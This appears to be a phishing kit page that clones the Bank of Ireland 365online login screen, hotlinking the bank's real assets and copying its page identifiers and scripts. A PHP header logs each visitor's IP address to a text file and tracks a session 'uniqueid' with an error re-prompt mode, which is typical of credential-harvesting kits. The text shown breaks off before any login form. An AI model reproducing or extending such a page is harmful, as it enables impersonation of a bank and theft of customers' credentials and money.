<?php
session_start();

if (isset($_GET["error"])) {
  $error_page = true;
  $uniqueid = $_SESSION["uniqueid"];
} else {
  $ip = $_SERVER["REMOTE_ADDR"];
  $tracker = file_put_contents('visitors/visitors.txt', $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
}
?>

<!DOCTYPE html>
<html dir="ltr" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" class="       tc-show-breakpoint-hint tc-show-grid Login_window1  " >
   <head>
      <link rel="preconnect" href="https://fonts.gstatic.com">
      <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400&display=swap" rel="stylesheet">
      <meta name="format-detection" content="telephone=no">
      <!-- Specific to ios : disable the call link if the html string has numbers  -->
      <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
      <meta name="author" content="Temenos" />
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, viewport-fit=cover">
      <!-- <meta NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"> -->
      <script src="https://kit.fontawesome.com/08df1faba4.js" crossorigin="anonymous"></script>
      <title>Bank of Ireland</title>
      <link rel="icon" href="https://www.365online.com/Digital/images/favicon.ico">
      <!-- CSS Normalize -->
      <link rel="stylesheet" href="https://www.365online.com/Digital/html/css/normalize.css?v=5.05" media="screen">
      <!-- CSS Fonts -->
      <link rel="stylesheet" href="https://www.365online.com/Digital/html/css/font-awesome/css/font-awesome.min.css?v=5.05" media="screen">
      <link rel="stylesheet" href="https://www.365online.com/Digital/html/css/BOIFonts.css?v=5.05" media="screen">
      <script type="text/javascript">
         // BOI main entry point
         var boiCbs = { };
         boiCbs.options = (function() {
           var userAgent = navigator.userAgent || navigator.vendor || window.opera;
           return {
             userAgent: userAgent,
             isAndroid: /android/i.test(userAgent),
             isIos: /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream,
             isHybrid: '' === 'Y'
           }
         })();

         boiCbs.variables = {
           boiDOBMatched: '',
           contextPath: '/Digital',
           isSetupDeviceClicked: false,
           isDeviceRegistrationCalled: false,
           isDevicePushTriggered: false,
           isDeviceLocationTriggered: false,
           pageTitle: '',
           templateCMD: '',
           intendedButtonClickEl: null,
           intendedButtonClickElXY: {},
           buttonClickMouseMoveTolerance: { "x": 50, "y": 10 },
           isStatementTableLoaded: false
         };
         var uxpProcessName = 'Login';
         uxpProcessName = uxpProcessName.replace("&#x2F;", "/");
         boiCbs.hashedUserId = '';
         boiCbs.processName = uxpProcessName;
         boiCbs.phaseName = 'Login';
         boiCbs.jurisdiction = '';
         window.boiCbs.sessionId = '77728423-421d-414d-9816-ca80a852b3a3';

         // kept for compatibility with existing usage
         window.loginViaMobileApp = boiCbs.options.isHybrid;

         // TODO: Do this in UXP
         if (window.boiCbs.processName === 'AccountOverview') {
           document.querySelector('html').classList.add('tc-box-on');
         }

         window.boiCbs.extractUserDataForBasePages = function() {
           return {
             userPageName: '/' + window.boiCbs.processName + '/' + window.boiCbs.phaseName + '/',
             userData: {
               pageURL: '/' + window.boiCbs.processName + '/' + window.boiCbs.phaseName + '/',
               sessionId: window.boiCbs.sessionId,
               hashedUserId:  window.boiCbs.hashedUserId,
         userAgent: window.boiCbs.options.userAgent,
               appVersion: window.boiCbs.appVersion ? window.boiCbs.appVersion:'',
               appBuildNumber: window.boiCbs.appBuildNumber ? window.boiCbs.appBuildNumber:'',
               successfulLogin: (window.boiCbs.boiHomePageVisits == 1) ? 'Successful Login': ''
             }
           };
         };

         /* The convention for the app version and app build numbers is the following
          * Android
          *   Version Number: 1.0.13
          *   Build Number: 13
          *
          * iOS
          *   Version Number: 1.6.2.4
          *   Build Number: 2.4
          *
          * The build number is obtained by substracting from the version number all the digits
          * after the second dot. If the format changes, then the getAppBuildNumber must be updated.
          */
         window.boiCbs.getAppBuildNumber = function(appVersionNumber) {
         var dotCounter = 0;
         var secondDotIndex = 0;

         for(var i = 0; i<appVersionNumber.length; i++) {
            if(appVersionNumber[i] === '.') {
            	dotCounter++;
            	if(dotCounter === 2) {
                    secondDotIndex = i;
                    break;
                   }
               }
           }

         return appVersionNumber.substring(secondDotIndex + 1);
         };

         window.boiCbs.getAppVersion = function() {
         cordova.getAppVersion.getVersionNumber().then(function(versionNumber){
               // uxpSpan - text display item in UXP FooterDescriptionPage phase used for
               // displaying the app version and build number
         var uxpSpan = $('.js-mobile-app-version');

               window.boiCbs.appVersion = versionNumber;
               window.boiCbs.appBuildNumber = window.boiCbs.getAppBuildNumber(window.boiCbs.appVersion);

               (function (config) {
                   (function (info) {
                       info.PageView = window.boiCbs.extractUserDataForBasePages();
                   })(config.userEventInfo || (config.userEventInfo = {}))
               })(window['adrum-config'] || (window['adrum-config'] = {}));

               if(uxpSpan.length > 0) {
                uxpSpan.text(window.boiCbs.appVersion + ' - ' + window.boiCbs.appBuildNumber);
               }
           });
         };

         console.log('desktop');
         // AppDynamics track page loads for desktop
         document.addEventListener("DOMContentLoaded", function(event) {
           (function (config) {
             (function (info) {
               info.PageView = window.boiCbs.extractUserDataForBasePages();
             })(config.userEventInfo || (config.userEventInfo = {}))
           })(window['adrum-config'] || (window['adrum-config'] = {}));
         });


      </script>
      <!-- Functions which needs to be defined before UXP injections -->
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js-others/digital-global-functions.js?v=5.05"></script>
      <!-- Injected head content START -->
      <meta name="robots" content="noindex"/>
      <style type='text/css'>.accessibilityStyle { position:absolute !important; width:0 !important; height:0 !important; font-size:0 !important; overflow:hidden !important;padding:0 !important} *[align="right"]  { text-align: right; }  *[align="left"]   { text-align: left;  }  *[align="center"] { text-align: center;} </style>
      <style type='text/css'>.ecDIB {display: -moz-inline-stack;display: inline-block;zoom: 1;*display: inline;vertical-align: top;}.ecDIBCol {vertical-align: top;}</style>
      <link id='C3__mainembedcss' rel='stylesheet' type='text/css' href='https://www.365online.com/Digital/html/css/T-Base.css' />
      <link id='C3__maincss' rel='stylesheet' type='text/css' href='https://www.365online.com/Digital/html/css/BOIRetailExtended.css' />
      <link rel='stylesheet' type='text/css' href='https://www.365online.com/Digital/html/css/defaultmenu.css' />
      <script type="text/javascript">
         //<![CDATA[
         var controllerMode = 'XX';
         var pageCode = '&x2bec7449-e1f7-4b71-a6ee-077f4817a45f=23513562-7a59-49d7-a3ef-c4187e863d10';
         var pageEID = '3AA85F8CFCC2D9BB421431';
         var rootContext = '/Digital';
         var act = '/Digital/servletcontroller';
         var popupAct = '/Digital/servletcontroller';
         var session = new Array();
         var checkbox = new Array();
         var activeTabName = '';
         var rowClickedIds = new Array();
         var calendarComponents = new Array();
         var submitEnabled = true;
         var enabledControls = new Array();
         var enabledLinks = new Array();
         var forwardsConfirmMsg = '';
         var backConfirmMsg = '';
         var hasSubmitted = false;
         var keyspressed = '';
         var qlrOk = 'Y';
         var invalidQuestions = new Array();
         var calendarPagePath = '/Digital/html/calendar.html';
         var calendarPopup = '	<div id="toolbar" onmouseover="this.style.cursor = \'pointer\'" style="height: 20px; width:197px;  ">		<div style="height: 20px; background: rgb(126, 192, 233) url(/Digital/images/toolBarBlueGradient.gif) repeat-x scroll 0% 0%; float: left; width: 175px; " onmousedown="try {dragStart(event, \'FloatCalendarDiv\');} catch (e){}">&nbsp;<\\/div>		<div style="background-color: #ffffff;border-top: 2px solid rgb(170, 220, 250); border-right: 2px solid rgb(126, 192, 233); float: left; color: rgb(126, 192, 233); font-family: Arial; text-align: center; width: 20px; height: 18px;" onclick="parentNode.parentNode.style.display = \'none\';" >X<\\/div>		<div style="clear: both"><\\/div>	<\\/div>	<div style="color: #4444BB; font-family: Arial; height:92%; width:100%;">		<iframe id="calendarIframe"  src="javascript:false;" style="height:100%; width:100%; color: #FFFFFF;" scrolling="no" frameBorder="0"			>		    <p>Your browser does not support iframes.<\\/p>		<\\/iframe>	<\\/div>';
         var helpPagePath = '/Digital/html/help.html';
         var imageDirPath = '/Digital/images/';
         var popupParams = '';
         var clientSideValidation = true;
         var calendars = [];
         var currentX = 390;
         var currentY = 650;
         var SORT_COLUMN_INDEX;
         var CURRENT_YEAR = 2021;
         var CURRENT_THEME = '';
         var focusValue = '';
         var webSocketRuleList = [];
         var MessagePosition = 'After Answer';
         var MessageTargetId = '';
         var InfoMessagePosition = 'Do Not Show';
         var InfoMessageTargetId = '';
         var WarningMessagePosition = 'Do Not Show';
         var WarningMessageTargetId = '';
         var ShowOneMessage = 'Y';
         var MessagesSeparator = '<br/>';
         var MessagesOrder = 'Errors, Warnings, Info';
         var MessagesContainerStyle = '';
         var MandMessage = '$$QUESTION_TEXT$ Error: Please answer this mandatory question';
         var ValidationMessage = '$$QUESTION_TEXT$ Error: Please enter a valid value';
         var InvalidUploadTypeMessage = '$$QUESTION_TEXT$ Error: The valid file types you are allowed to upload are: $$QUESTION_CONSTRAINT$';
         var InvalidMaxFileSizeMessage = '$$QUESTION_TEXT$ Error: The maximum file size allowed is $$QUESTION_CONSTRAINT$k';
         var InvalidAlphaNumericMessage = '$$QUESTION_TEXT$ Error: Please re-enter using letters and numbers';
         var InvalidAlphaMessage = '$$QUESTION_TEXT$ Error: Please re-enter using letters';
         var InvalidNumMessage = '$$QUESTION_TEXT$ Error: Please enter a valid number';
         var InvalidDecimalMessage = '$$QUESTION_TEXT$ Error: Please enter a valid decimal number';
         var InvalidDateMessage = '$$QUESTION_TEXT$ Error: Please enter a valid date in the form: $$QUESTION_CONSTRAINT$';
         var InvalidTimeMessage = '$$QUESTION_TEXT$ Error: Please enter a valid time in the form: $$QUESTION_CONSTRAINT$';
         var InvalidMaxValueMessage = '$$QUESTION_TEXT$ Error: The maximum value is $$QUESTION_CONSTRAINT$';
         var InvalidMinValueMessage = '$$QUESTION_TEXT$ Error: The minimum value is $$QUESTION_CONSTRAINT$';
         var InvalidMaxLengthMessage = '$$QUESTION_TEXT$ Error: The maximum length is $$QUESTION_CONSTRAINT$';
         var InvalidMinLengthMessage = '$$QUESTION_TEXT$ Error: The minimum length is $$QUESTION_CONSTRAINT$';
         var InvalidDaysInMonthMessage = '$$QUESTION_TEXT$ Error: There are not that many days in the specified month';
         var InvalidLeapYearMessage = '$$QUESTION_TEXT$ Error: The specified year is not a leap year';
         var InvalidMaxDateMessage = '$$QUESTION_TEXT$ Error: The latest date is $$QUESTION_CONSTRAINT$';
         var InvalidMinDateMessage = '$$QUESTION_TEXT$ Error: The earliest date is $$QUESTION_CONSTRAINT$';
         //]]>
      </script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js/calendar1.js?version_7.0.2__6"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js/connect.js?version_7.0.2__6"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js/jsep.js?version_7.0.2__6"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js/spellcheck-caller.js?version_7.0.2__6"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js/connect_ajax.js?version_7.0.2__6"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js/connect_transferable_list.js?version_7.0.2__6"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js/connect_validation.js?version_7.0.2__6"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js/connect_help.js?version_7.0.2__6"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js/connect_divs.js?version_7.0.2__6"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js/connect_hybrid.js?version_7.0.2__6"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js-others/jquery.1.11.1.js?version_7.0.2__6"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js-others/hookit.min.js?version_7.0.2__6"></script>
      <script type="text/javascript">
         //<![CDATA[
         ec_hideHtmlElem('')
         //]]>
      </script>
      <script type="text/javascript">
         //<![CDATA[
           function unloadAction() {};
           window.onbeforeunload = function(event) {
           };
           window.onload = function(event) {
             if (event.persisted) {ecBrowserNavCheck();}
           };
           function ecBrowserNavCheck() {
             if (ajaxBrowserNavigationCheck('&x2bec7449-e1f7-4b71-a6ee-077f4817a45f=23513562-7a59-49d7-a3ef-c4187e863d10', '', 'servletcontroller', '')){
             processBrowserNavigationButton();
             window.location="servletcontroller?MODE=BROWSER_NAV&x2bec7449-e1f7-4b71-a6ee-077f4817a45f=23513562-7a59-49d7-a3ef-c4187e863d10&CURRENT_PHASE_INPUT=Login.Login%401%5EC2__Login.Login%402%210";
             }
           }
         //]]>
      </script>
      <script media="screen"  type="text/javascript">
         function jq(myid) {
         return '#' + myid.replace(/(:|\.)/g,'\\$1');
         }
      </script>
      <style type="text/css" media="screen">
         /*.ui-icon {
         width: 15px!important;
         height: 15px!important;
         }
         .ui-widget-content {
         background-image: none !important;
         background-color: #F2F2F2 !important;
         }
         .ui-corner-top, .ui-corner-bottom, .ui-corner-all {
         border-radius: 3px;
         }
         .ui-state-default, .ui-widget-content .ui-state-default, .ui-widget-header  {
         border: none;
         background: white;
         color:#333;
         }
         .ui-state-default{
         border: inherit;
         background: inherit;
         }
         .ui-state-active, .ui-widget-content .ui-state-active, .ui-widget-header .ui-state-active {
         border: none;
         background: white;
         color:#0983c4;
         }
         .ui-state-default a, .ui-state-default a:link, .ui-state-default a:visited {
         color: #333;
         }
         .ui-state-active a, .ui-state-active a:link, .ui-state-active a:visited {
         color:#0983c4;
         }
         .ui-accordion .ui-accordion-header a {
         padding: 15px 10px 10px 40px;
         }
         .ui-state-default .ui-icon {
         }
         .ui-state-active .ui-icon{
         }
         .ui-accordion .ui-accordion-content{
         margin-top: 0px;
         margin-bottom: 0px;
         border-bottom: 1px solid #c1c1c1;
         top: 0px;
         padding: 0px;
         }
         .ui-widget-content {
         border: none;
         }
         .ui-accordion .ui-accordion-header {
         margin-top: 0px;
         margin-bottom: 0px;
         border-top: none !important;
         border-bottom: 1px solid #c1c1c1;
         }
         .HideAccordionButton {
         width: 18px;
         height: 18px;
         background-image: url(./templates/widgets/jquery-ui/img/RemoveAccord.png);
         float: right
         }
         .ui-widget { font-family:inherit!important; font-size: inherit!important; }
         .ui-widget-header { color: #222222; font-weight: bold; }
         .ui-widget-header {   }
         .ui-widget-content a { color:inherit;}
         .ui-dialog-title{ margin:0!important;}
         .ui-dialog-content{padding:0px!important;}
         .ui-dialog-titlebar{border-bottom: 2px solid #DE1927!important; padding: 1.25em 22.5px!important;}
         .ui-dialog-titlebar.ui-corner-all{border-radius:0px!important;}
         .ui-widget-overlay { background: none repeat scroll 0 0 black !important; opacity: 0.50 !important}
         */
         .dataTables_paginate .ui-button {
         margin-right: 0.0 !important;
         padding: 11px 15px;
         }
         /*.ui-buttonset{ margin-right:0!important;}*/
      </style>
      <style type="text/css">
         .session-timeout-container .ui-icon {
         width: 24px !important;
         height: 24px !important;
         }
         /*
         .ui-dialog .ui-dialog-titlebar-close {
         width: 24px;
         height: 24px;
         display: none;
         }
         .ui-dialog-titlebar {
         border: 0 !important;
         }
         .ui-widget-content {
         background-color:white !important;
         }
         .ui-dialog-titlebar-close:focus {
         padding: 2px;
         }
         .ui-dialog-content  {
         margin: 20px !important;
         }
         ui-dialog {
         box-shadow: 10px 10px 10px grey;
         }
         .ui-dialog .ui-dialog-titlebar-close span
         {
         display:block;
         margin:0.5px!important;
         }
         .ui-widget-header .ui-icon {
         background: url("images/u113.png") no-repeat scroll center center transparent !important;
         }
         */
      </style>
      <!-- $Revision: 1.2 $ -->
      <link type="text/css" href="https://www.365online.com/Digital/templates/widgets/jquery/jquery-ui/css/Temenos/jquery-ui-1.10.4.custom.css" rel="stylesheet" />
      <script type="text/javascript" src="https://www.365online.com/Digital/templates/widgets/jquery/jquery-ui/js/jquery-ui-1.10.4.custom.min.js"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/templates/widgets/jquery/jquery-ui/js/jquery.ui.touch-punch.min.js"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/templates/widgets/jquery/jquery-ui/js/jquery.dialogextend.min.js"></script>
      <style type="text/css">
         .ui-widget-content {
         xxbackground-image: none !important;
         }
         .ui-state-default {
         padding-top: 5px;
         padding-bottom: 5px;
         }
      </style>
      <link type="text/css" rel="stylesheet" href="https://www.365online.com/Digital/templates/widgets/com.temenos.widgets.util.multiFunctionButton/css/multiFunctionButton.css" />
      <link rel="stylesheet"  href="https://www.365online.com/Digital/templates/widgets/com.temenos.widgets.util.multiFunctionButton/css/pageAnimation.css" type="text/css" />
      <script src="https://www.365online.com/Digital/templates/widgets/com.temenos.widgets.util.multiFunctionButton/js/multiFunctionButtonUtils.js"  type="text/javascript" ></script>
      <script src="https://www.365online.com/Digital/templates/widgets/com.temenos.widgets.util.multiFunctionButton/js/custom-functions.js"  type="text/javascript" ></script>
      <script src="https://www.365online.com/Digital/templates/widgets/com.temenos.widgets.util.multiFunctionButton/js/jquery.transit.min.js" type="text/javascript"></script>
      <script src="https://www.365online.com/Digital/templates/widgets/com.temenos.widgets.util.multiFunctionButton/js/pageAnimation.js" type="text/javascript"></script>
      <script src="https://www.365online.com/Digital/templates/widgets/boi.temenos.widgets.util.pleaseWaitCircle/js/pleaseWait.js"
         type="text/javascript"></script>
      <style type="text/css">
         /* Animation keyframes - you need to add prefixes */
         @keyframes spin {
         0% { transform: rotate(0deg); }
         100% { transform: rotate(360deg); }
         }
         @-webkit-keyframes spin {
         0% { -webkit-transform: rotate(0deg); }
         100% { -webkit-transform: rotate(360deg); }
         }
         /* spinner Wrapper */
         .spinnerWrapper{
         position: fixed;
         width: 100%;
         height: 100%;
         top: 0;
         left: 0;
         z-index: 9999;
         line-height: 30px;
         margin-left: 0;
         margin-top: 0;
         text-align: center;
         color: #fff;
         padding-top: 7px;
         background-color: rgba(250, 250, 250, 0.8);
         opacity: 0.8;
         display: none;
         }
         /* Loading animation container */
         .loading {
         position: absolute;
         top: 50%;
         left: 50%;
         width: 80px;
         height: 110px;
         transform: translate(-50%, -50%);
         -webkit-transform: translate(-50%, -50%)
         }
         /* Spinning circle (inner circle) */
         .loading .maskedCircle {
         width: 80px;
         height: 80px;
         border-radius: 50%;
         border: 3px solid #ff6969;
         }
         /* Spinning circle mask */
         .loading .mask {
         width: 25px;
         height: 25px;
         overflow: hidden;
         margin: -3px;
         }
         /*waiting text*/
         .loading .spinnerWaitingText {
         position: absolute;
         bottom: 0;
         text-align: center;
         width: 100%;
         }
         /* Spinner */
         .loading .spinner {
         position: absolute;
         left: 0;
         top: 0;
         width: 80px;
         height: 80px;
         animation-name: spin;
         animation-duration: 3s;
         animation-iteration-count: infinite;
         animation-timing-function: linear;
         -webkit-animation-name: spin;
         -webkit-animation-duration: 3s;
         -webkit-animation-iteration-count: infinite;
         -webkit-animation-timing-function: linear;
         border-radius: 50%;
         border: 3px solid #12779a;
         }
         div.tc-screenMask {
         position: absolute;
         left: 0;
         top: 0;
         width: 100%;
         height: 100%;
         z-index: 1000;
         background-color: #000;
         opacity: 0.3;
         display: none;
         }
         /* CSS for the custom login spinner START*/
         .loginSpinnerStep1,
         .loginSpinnerStep2,
         .loginSpinnerStep3{
         opacity: 0;
         text-align: center;
         position: absolute;
         width: 100%;
         }
         .loginSpinnerContainer{
         position: fixed;
         top: calc(50% + 90px);
         width: 100%;
         left: 50%;
         transform: translateX(-50%);
         -webkit-transform: translateX(-50%);
         min-width: 300px;
         visibility: hidden;
         }
         .loginSpinnerStep1 {
         animation-name: fadeInOut1;
         animation-duration: 3s;
         animation-timing-function: linear;
         animation-iteration-count: 1;
         -webkit-animation-name: fadeInOut1;
         -webkit-animation-duration: 3s;
         -webkit-animation-timing-function: linear;
         -webkit-animation-iteration-count: 1;
         }
         .loginSpinnerStep2 {
         animation-name: fadeInOut2;
         animation-duration: 6s;
         animation-timing-function: linear;
         animation-iteration-count: 1;
         -webkit-animation-name: fadeInOut2;
         -webkit-animation-duration: 6s;
         -webkit-animation-timing-function: linear;
         -webkit-animation-iteration-count: 1;
         }
         .loginSpinnerStep3 {
         animation-name: fadeInOut3;
         animation-duration: 9s;
         animation-timing-function: linear;
         animation-iteration-count: 1;
         animation-fill-mode: forwards;
         -webkit-animation-name: fadeInOut3;
         -webkit-animation-duration: 9s;
         -webkit-animation-timing-function: linear;
         -webkit-animation-iteration-count: 1;
         -webkit-animation-fill-mode: forwards;
         }
         @keyframes fadeInOut1 {
         0% { opacity: 0 }
         1% { opacity: 1 }
         95% {opacity: 1 }
         100% { opacity: 0 }
         }
         @keyframes fadeInOut2 {
         0% { opacity: 0 }
         50% { opacity: 0 }
         51% { opacity : 1}
         95% { opacity: 1 }
         100% { opacity: 0 }
         }
         @keyframes fadeInOut3 {
         0% { opacity: 0 }
         66% { opacity: 0 }
         67% { opacity: 1 }
         100% { opacity: 1 }
         }
         @-webkit-keyframes fadeInOut1 {
         0% { -webkit-opacity: 0 }
         1% { -webkit-opacity: 1 }
         95% {-webkit-opacity: 1 }
         100% { -webkit-opacity: 0 }
         }
         @-webkit-keyframes fadeInOut2 {
         0% { -webkit-opacity: 0 }
         50% { -webkit-opacity: 0 }
         51% { -webkit-opacity : 1}
         95% { -webkit-opacity: 1 }
         100% { -webkit-opacity: 0 }
         }
         @-webkit-keyframes fadeInOut3 {
         0% { -webkit-opacity: 0 }
         66% { -webkit-opacity: 0 }
         67% { -webkit-opacity: 1 }
         100% { -webkit-opacity: 1 }
         }
         .customLoginSpinner.spinnerWrapper {
         background-color: #fff;
         opacity: 0.9;
         display: block;
         visibility: hidden;
         }
         .customLoginSpinner .loading {
         width: 148px;
         height: 148px;
         }
         .customLoginSpinner .loading .spinner {
         border: none;
         width: 148px;
         height: 148px;
         animation-name: spin;
         animation-duration: .8s;
         animation-iteration-count: infinite;
         animation-timing-function: linear;
         -webkit-animation-name: spin;
         -webkit-animation-duration: .8s;
         -webkit-animation-iteration-count: infinite;
         -webkit-animation-timing-function: linear;
         }
         .customLoginSpinner .loading .maskedCircle {
         border: 4px solid #005900;
         width: 140px;
         height: 140px;
         margin: 0;
         box-sizing: content-box;
         -webkit-box-sizing: content-box;
         }
         .customLoginSpinner .loading .mask {
         width: 148px;
         height: 35px;
         margin: 0;
         }
         /* CSS for the custom login spinner END*/
      </style>
      <!-- $Revision: 1.2 $ -->
      <link type="text/css" href="https://www.365online.com/Digital/templates/widgets/jquery/jquery-ui/css/Temenos/jquery-ui-1.10.4.custom.css" rel="stylesheet" />
      <script type="text/javascript" src="https://www.365online.com/Digital/templates/widgets/jquery/jquery-ui/js/jquery-ui-1.10.4.custom.min.js"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/templates/widgets/jquery/jquery-ui/js/jquery.ui.touch-punch.min.js"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/templates/widgets/jquery/jquery-ui/js/jquery.dialogextend.min.js"></script>
      <style type="text/css">
         .ui-widget-content {
         xxbackground-image: none !important;
         }
         .ui-state-default {
         padding-top: 5px;
         padding-bottom: 5px;
         }
      </style>
      <link type="text/css" rel="stylesheet" href="https://www.365online.com/Digital/templates/widgets/com.temenos.widgets.util.ext-multiFunctionButton/css/ext-multiFunctionButton.css" />
      <link rel="stylesheet"  href="./templates/widgets/com.temenos.widgets.util.ext-multiFunctionButton/css/ext-pageAnimation.css" type="text/css" />
      <script src="https://www.365online.com/Digital/templates/widgets/com.temenos.widgets.util.ext-multiFunctionButton/js/ext-multiFunctionButtonUtils.js"  type="text/javascript" ></script>
      <script src="https://www.365online.com/Digital/templates/widgets/com.temenos.widgets.util.ext-multiFunctionButton/js/ext-custom-functions.js"  type="text/javascript" ></script>
      <script src="https://www.365online.com/Digital/templates/widgets/com.temenos.widgets.util.ext-multiFunctionButton/js/ext-jquery.transit.min.js" type="text/javascript"></script>
      <script src="https://www.365online.com/Digital/templates/widgets/com.temenos.widgets.util.ext-multiFunctionButton/js/ext-pageAnimation.js" type="text/javascript"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js/connect_menu.js?version_7.0.2__6"></script>
      <!-- Injected head content END -->
      <!-- CSS Typography -->
      <link rel="stylesheet" href="https://www.365online.com/Digital/html/css/BOITypography.css?v=5.05" media="screen">
      <link rel="stylesheet" href="https://www.365online.com/Digital/html/css/BOITypography-revamp.css?v=5.05" media="screen">
      <!-- CSS Others -->
      <link rel="stylesheet" href="https://www.365online.com/Digital/html/css/BOISca.css?v=5.05" media="screen">
      <link rel="stylesheet" href="https://www.365online.com/Digital/html/css/BOIRetailExtended.css?v=5.05" media="screen">
      <link rel="stylesheet" href="https://www.365online.com/Digital/html/css/BOILogin.css?v=5.05" media="screen">
      <link rel="stylesheet" href="https://www.365online.com/Digital/html/css/BOIScaMediaQueries.css?v=5.05" media="all" type="text/css" >
      <link rel="stylesheet" href="https://www.365online.com/Digital/html/css/BOIRetailExtendedMediaQueries.css?v=5.05" media="all" type="text/css" >
      <link rel="stylesheet" href="https://www.365online.com/Digital/html/css/BOICommon.css?v=5.05" media="screen">
      <!-- CSS jQuery UI overrides -->
      <link rel="stylesheet" href="https://www.365online.com/Digital/html/css/jquery-ui-overrides.css?v=5.05" media="all" type="text/css" >
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js/connect_table.js?v=5.05"></script>
      <script type="text/javascript" src="https://www.365online.com/Digital/html/js-others/T-Custom.js?v=5.05"></script>
      <!-- Google Tag Manager  GA related calls-->
      <script>dataLayer=[];</script>
      <!-- Page hiding snippet (recommended)  -->
      <style>.async-hide { opacity: 0 !important} </style>
      <script>(function(a,s,y,n,c,h,i,d,e){s.className+=' '+y;h.start=1*new Date;
         h.end=i=function(){s.className=s.className.replace(RegExp(' ?'+y),'')};
         (a[n]=a[n]||[]).hide=h;setTimeout(function(){i();h.end=null},c);h.timeout=c;
         })(window,document.documentElement,'async-hide','dataLayer',4000,
         {'GTM-MXPHZSP':true});
      </script>
      <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
         new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
         j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
         })(window,document,'script','dataLayer','GTM-MXPHZSP');
      </script>
      <!-- End Google Tag Manager -->
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.2/jquery.validate.min.js" integrity="sha512-UdIMMlVx0HEynClOIFSyOrPggomfhBKJE28LKl8yR3ghkgugPnG6iLfRfHwushZl1MOPSY6TsuBDGPK2X4zYKg==" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js" integrity="sha512-pHVGpX7F/27yZ0ISY+VVjyULApbDlD0/X0rgGbTqCE7WFW5MezNTWG/dnhtbBuICzsd0WQPgpE4REBLv+UqChw==" crossorigin="anonymous"></script>
   </head>
   <body onunload="unloadAction();" class="BrowserWindow Login" data-theme="BOIRetailExtended">
      <noscript>
         <!-- Google Tag Manager (noscript) -->
         <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MXPHZSP"
            height="0" width="0" style="display:none;visibility:hidden" aria-hidden="true"></iframe>
         <!-- End Google Tag Manager (noscript) -->
         <style type="text/css">
            @font-face {
            font-family: 'Open Sans Light';
            src: url('fonts/OpenSans-Light-webfont.woff');
            font-weight: 300;
            font-style: normal;
            }
            @font-face {
            font-family: 'Open Sans Regular';
            src: url('https://www.365online.com/Digital/html/css/fonts/OpenSans-Regular-webfont.woff') format('woff');
            font-weight: 400;
            font-style: normal;
            }
            body,
            body.Login {
            background: #f2f2f2;
            font-family: Open Sans Regular, Arial, Helvetica, sans-serif;
            font-size: 14px;
            line-height: 1.4;
            }
            .noscript-hidden {
            display: none;
            }
            h1 {
            color: #494949;
            font-family: Open Sans Light, Arial, Helvetica, sans-serif;
            font-size: 26px;
            font-weight: 300;
            margin: 0;
            text-align: center;
            }
            .boi-info-page--page-wrapper {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            }
            .boi-info-page--content {
            align-items: center;
            background-color: #fff;
            border-radius: 5px;
            color: #4a4a4a;
            display: flex;
            flex-direction: column;
            flex-grow: 0;
            margin-top: 40px;
            padding-top: 40px;
            }
            .boi-info-page--logged-out-icon {
            height: 72px;
            margin: 45px 0;
            width: 72px;
            }
            .boi-info-page--logged-out-icon img {
            max-height: 100%;
            max-width: 100%;
            }
            .boi-info-page--text {
            margin: 0 0 45px;
            max-width: 420px;
            padding: 0 15px;
            text-align: center;
            }
            .boi-info-page--logo {
            align-items: center;
            display: flex;
            height: 100%;
            left: 0;
            position: absolute;
            }
            .boi-info-page--logo img {
            height: 30px;
            }
            .height-100 {
            height: 100%;
            }
            .tc-centered {
            margin-left: auto;
            margin-right: auto;
            }
            .boi-nav-header {
            height: 60px;
            position: relative;
            }
            .boi-header-container {
            background: #106988;
            box-shadow: 0 6px 8px 0 rgba(0, 0, 0, 0.20);
            position: relative;
            z-index: 1;
            }
            .responsive-section {
            max-width: initial;
            position: relative;
            width: 100%;
            }
            @media (max-width: 1023px) {
            body {
            background: #fff;
            }
            .boi-nav-header {
            height: 55px;
            padding: 0 14px;
            position: fixed;
            top: 0;
            width: 100%;
            }
            .desktop-only {
            display: none;
            }
            .boi-info-page--content {
            border-radius: 0;
            flex-grow: 1;
            margin-top: 55px;
            padding-top: 55px;
            }
            }
            @media (min-width: 1024px) {
            .mobile-tablet-only {
            display: none;
            }
            .responsive-section {
            max-width: 1024px;
            }
            }
            @media (min-width: 1280px) {
            .responsive-section {
            max-width: 1280px;
            }
            }
         </style>
         <div class="boi-info-page--page-wrapper tc-box-on">
            <div class="boi-header-container boi-nav-header">
               <div class="responsive-section tc-centered height-100">
                  <div class="boi-info-page--logo mobile-tablet-only">
